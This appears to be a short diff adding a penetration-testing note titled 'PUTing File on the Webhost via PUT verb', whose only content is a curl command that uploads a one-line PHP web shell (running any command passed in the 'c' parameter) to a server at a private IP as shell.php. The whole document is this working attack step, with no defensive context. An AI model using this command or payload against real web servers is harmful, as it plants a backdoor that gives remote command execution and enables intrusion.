@@ -1,0 +1,2 @@
+##PUTing File on the Webhost via PUT verb##
+curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
